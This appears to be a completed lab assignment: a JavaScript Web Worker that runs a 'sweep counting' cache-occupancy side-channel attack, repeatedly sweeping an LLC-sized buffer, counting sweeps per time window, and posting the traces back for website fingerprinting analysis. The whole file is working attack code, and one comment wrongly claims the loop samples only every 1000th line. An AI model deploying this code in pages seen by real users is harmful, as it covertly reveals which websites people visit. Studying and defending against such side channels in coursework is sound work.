/* Find the cache line size by running `getconf -a | grep CACHE` */
const LINESIZE = 64;
/* Find the L3 size by running `getconf -a | grep CACHE` */
const LLCSIZE = 8 * 1024 * 1024;
/* Collect traces for 10 seconds; you can vary this */
const TIME = 10000;
/* Collect traces every 10ms; you can vary this */
const P = 10;

function sweep(P) {
  /*
   * Implement this function to run a sweep of the cache.
   * 1. Allocate a buffer of size LLCSIZE.
   * 2. Read each cache line (read the buffer in steps of LINESIZE).
   * 3. Count the number of times each cache line is read in a time period of P milliseconds.
   * 4. Store the count in an array of size K, where K = TIME / P.
   * 5. Return the array of counts.
   */
  const buffer = new ArrayBuffer(LLCSIZE);
  const view = new Uint8Array(buffer);
  const numCacheLines = LLCSIZE / LINESIZE;
  const K = Math.floor(TIME / P);

  // Create simple array of K sweep counts (should be 100)
  const counts = new Array(K).fill(0);

  console.log(`=== Sweep Counting Attack ===`);
  console.log(`LLC Size: ${LLCSIZE} bytes (${LLCSIZE / (1024 * 1024)} MB)`);
  console.log(`Cache Line Size: ${LINESIZE} bytes`);
  console.log(`Total Cache Lines: ${numCacheLines}`);
  console.log(`Time Window: ${P}ms, Total Duration: ${TIME}ms`);
  console.log(`Number of Intervals: ${K}`);
  console.log(`Output: Simple array of ${K} sweep counts`);

  let intervalIndex = 0;
  const startTime = performance.now();

  while (intervalIndex < K) {
    let sweepCount = 0;
    const intervalStart = performance.now();

    // Count total sweeps in this time interval
    while (performance.now() - intervalStart < P) {
      // Perform one sweep through cache lines (sample every 1000th for speed)
      for (let i = 0; i < numCacheLines; i++) {
        let temp = view[i * LINESIZE];
      }
      sweepCount++;
    }

    // Store the sweep count for this interval
    counts[intervalIndex] = sweepCount;
    intervalIndex++;
    if (intervalIndex % 100 === 0 || intervalIndex <= 10) {
      console.log(
        `Interval ${intervalIndex}/${K} - Collecting side-channel data...`
      );
    }
  }

  const endTime = performance.now();
  console.log(`=== Sweep Counting Attack Complete ===`);
  console.log(`Total time: ${(endTime - startTime).toFixed(2)}ms`);
  console.log(`Intervals collected: ${K}`);
  console.log(`Data points: ${K} sweep counts`);
  console.log(`Sample data: [${counts.slice(0, 5).join(", ")}...]`);
  console.log(`Data ready for website fingerprinting analysis`);

  return counts;
}

self.addEventListener("message", function (e) {
  /* Call the sweep function and return the result */
  if (e.data.action === "start") {
    const P = e.data.P || 10;
    console.log(`=== Starting Sweep Counting Side-Channel Attack ===`);
    console.log(`Time window P = ${P}ms (based on Task 1 timing resolution)`);
    const result = sweep(P);

    console.log(
      `Sending ${result.length} sweep counts to backend for analysis`
    );
    self.postMessage({
      action: "complete",
      data: result,
      timestamp: Date.now(),
      metadata: {
        P: P,
        intervals: result.length,
        data_points: result.length,
        attack_type: "sweep_counting",
      },
    });
  }
});
